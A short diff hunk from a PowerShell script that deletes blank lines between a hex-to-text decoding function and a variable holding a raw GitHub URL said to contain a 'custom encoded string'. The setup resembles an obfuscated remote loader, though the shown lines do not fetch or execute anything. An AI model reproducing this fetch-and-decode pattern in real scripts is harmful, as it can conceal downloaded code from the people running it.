@@ -43,8 +43,6 @@ Function Convert-HexToText {
     return -join $asciiOutput
 }
 
-
-
 # URL of the hosted text file
 $url = "https://raw.githubusercontent.com/notforuseactually/404/main/1.txt" # Replace this with the actual URL containing the custom encoded string
 
